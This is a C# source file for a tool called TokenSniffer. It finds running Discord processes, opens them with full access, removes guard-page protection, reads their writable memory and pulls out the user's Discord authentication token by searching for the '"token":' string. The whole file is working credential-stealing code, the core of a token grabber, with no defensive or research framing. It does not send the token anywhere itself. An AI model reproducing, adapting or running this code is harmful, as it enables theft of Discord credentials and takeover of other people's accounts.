//#define PRINT_INFO

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.ComponentModel;

namespace TokenSniffer
{
    public static class TokenSniffer
    {
        public static string RetrieveToken(Process proc)
        {
            // Get handle to the process
            IntPtr procHandle = WinAPI.OpenProcess(
                WinAPI.ProcessAccessFlags.All,
                false, proc.Id
            );

            // Create a MEMORY_BASIC_INFORMATION structure to get memory chunk information
            WinAPI.MEMORY_BASIC_INFO memInfo;
            int memInfoSz = Marshal.SizeOf<WinAPI.MEMORY_BASIC_INFO>();

            // Pointer to the currently analyzed chunk of memory
            IntPtr pChunk = proc.MainModule.BaseAddress;

            // Get the maximum address before which the memory is in discord.exe space
            ProcessModule[] modules = new ProcessModule[proc.Modules.Count];
            proc.Modules.CopyTo(modules, 0);
            ulong pMax = modules.Min(
                m => (m.BaseAddress == proc.MainModule.BaseAddress) ? 
                ulong.MaxValue : 
                (ulong)m.BaseAddress
            );
#if (PRINT_INFO)
            WriteColor($"Min. address : 0x{pChunk.ToString("X8")}\n");
            WriteColor($"Max. address : 0x{pMax.ToString("X8")}\n");
            WriteColor("---- STARTING SEARCH ----\n", ConsoleColor.White);
#endif
            // The target string is '"token":'
            byte[] data = new byte[9]
            {
                0x22, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x22, 0x3a, 0x22
            };
            
            while ((ulong)pChunk < pMax)
            {
                // Attempt to scan a chunk of memory
                if (WinAPI.VirtualQueryEx(procHandle, pChunk, out memInfo, memInfoSz) == memInfoSz)
                {
                    // Scan was successful, move to its base adress
                    pChunk = memInfo.BaseAddress;
#if (PRINT_INFO)
                    WriteColor($"Skipping chunk 0x{pChunk.ToString("X8")}", ConsoleColor.DarkGray);
#endif
                    // Check if data has read & write permission 
                    if (memInfo.Protect.HasFlag(WinAPI.MemoryProtection.PAGE_READWRITE))
                    {
                        // Allocate current process memory to store the chunk
                        IntPtr pRegion = Marshal.AllocHGlobal((int)memInfo.RegionSize);

                        // Remove guard page flag if necessary
                        WinAPI.VirtualProtectEx(procHandle, pChunk, memInfo.RegionSize, 
                            (uint)memInfo.Protect & (~0x100u), out uint oldProtect);

                        // Try to read the chunk and copy it into local memory
                        if (WinAPI.ReadProcessMemory(procHandle, pChunk, pRegion, (int)memInfo.RegionSize, out int nRead))
                        {
#if (PRINT_INFO)
                            Console.SetCursorPosition(0, Console.CursorTop);
                            WriteColor($"Scanning chunk 0x{pChunk.ToString("X8")}");
#endif
                            // Start searching for data in the (now local) chunk
                            for (int i = 0; i < nRead - data.Length; i++)
                            {   
                                // Check if current memory location matches data
                                if (WinAPI.memcmp(IntPtr.Add(pRegion, i), data, (IntPtr)data.Length) == 0)
                                {
                                    // Extract token
                                    StringBuilder sb = new StringBuilder();
                                    for (int j = 0, chr = 0; chr != 0x22; j++)
                                    {
                                        chr = Marshal.ReadByte(pRegion, i + data.Length + j);
                                        if (chr != 0x22) { sb.Append((char)chr); }
                                    }
                                    string token = sb.ToString();
                                    // If string is corrupted (can happen if heap data was partly overwritten)
                                    if (token.Any(char.IsControl)) { continue; }
#if (PRINT_INFO)
                                    IntPtr pToken = IntPtr.Add(pChunk, i + data.Length);
                                    WriteColor($"\n0x{pToken.ToString("X8")} : FOUND TOKEN {token}\n", ConsoleColor.White);

                                    // Put guard page flag back if removed
                                    WinAPI.VirtualProtectEx(procHandle, pChunk, memInfo.RegionSize, oldProtect, out oldProtect);
#endif
                                    // Free local chunk and process handle
                                    Marshal.FreeHGlobal(pRegion);
                                    WinAPI.CloseHandle(procHandle);
                                    
                                    return token;
                                }
                            }
                        }

                        // Put guard page flag back if removed
                        WinAPI.VirtualProtectEx(procHandle, pChunk, memInfo.RegionSize, oldProtect, out oldProtect);

                        // Free local chunk
                        Marshal.FreeHGlobal(pRegion);
                    }
#if (PRINT_INFO)
                    WriteColor("\n");
#endif
                    // Increment chunk pointer to move to next region
                    pChunk = IntPtr.Add(pChunk, (int)memInfo.RegionSize);
                }
            }

            // Token was not found; free process handle & return
            WinAPI.CloseHandle(procHandle);
            return null;
        }

        public static string RetrieveToken(bool cmdArgsCheck = true)
        {
            // Get Discord Process object 
            List<Process> procs = Process.GetProcessesByName("discord").ToList();
            if (procs.Count == 0) { throw new InvalidOperationException("Discord is not running"); }
#if (PRINT_INFO)
            WriteColor($"FOUND {procs.Count} DISCORD PROCESSES\n");
#endif
            if (cmdArgsCheck)
            {   // If argument checking is enabled, we get the command line arguments
                // of each process to filter out the GPU and Voice processes.
                procs = procs.Where(proc =>
                {
                    string[] args = GetCommandLine(proc).Split(' ');
                    if (args.Any(arg => arg == "--type=renderer" || arg == "--type=gpu-process"))
                    {  // Check if process is a renderer or gpu process
#if (PRINT_INFO)
                        WriteColor($"PROCESS {proc.Id} DISCARDED BY ARGUMENT SCAN\n", ConsoleColor.DarkGray);
#endif
                        return false;
                    }
                    return true;
                }).ToList();
            }

            string token = null;
            for (int i = 0; token == null && i < procs.Count; i++) {
#if (PRINT_INFO)
                WriteColor($"SEARCHING IN PROCESS {procs[i].Id}\n", ConsoleColor.White);
#endif          // Try to get token in each Discord process
                token = RetrieveToken(procs[i]);
            }
            return token;
        }

    private static string GetCommandLine(Process process)
    {
        string cmdLine = null;
        using (var searcher = new ManagementObjectSearcher(
            $"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}"))
        {
            var matchEnum = searcher.Get().GetEnumerator();
            if (matchEnum.MoveNext())
            {
                cmdLine = matchEnum.Current["CommandLine"]?.ToString();
            }
        }
        if (cmdLine == null)
        {
            var dummy = process.MainModule;
        }
        return cmdLine;
    }

    private static void WriteColor(string str, ConsoleColor fg = ConsoleColor.Gray, ConsoleColor bg = ConsoleColor.Black)
        {
            ConsoleColor pfg = Console.ForegroundColor;
            ConsoleColor pbg = Console.BackgroundColor;

            Console.ForegroundColor = fg;
            Console.BackgroundColor = bg;
            Console.Write(str);
            Console.ForegroundColor = pfg;
            Console.BackgroundColor = pbg;
        }
    }
}
